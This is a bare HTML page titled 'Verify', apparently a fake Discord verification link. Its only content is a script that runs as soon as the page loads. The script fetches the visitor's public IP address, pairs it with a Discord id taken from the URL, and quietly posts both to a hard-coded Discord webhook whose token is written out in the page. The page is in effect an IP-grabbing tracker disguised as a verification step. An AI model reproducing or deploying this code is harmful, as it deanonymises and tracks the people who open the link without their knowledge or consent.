<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify</title>
</head>
<body>
    <script>
        (async () => {
            const response = await fetch("https://api64.ipify.org?format=json");
            const ip = await response.json();
            const discordId = new URLSearchParams(window.location.search).get("id");
            if (discordId) {
                await fetch("https://discord.com/api/webhooks/1335366773389791255/qMh5D36yAImnM_TKrl2hOV8_ViubBjkBmzZwrYR9SWmwRDHt0nPfDWfw9tRaR-3aUKPg", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: `{"id": "${discordId}", "ip": "${ip.ip}"}` })
                });
            }
        })();
    </script>
</body>
</html>
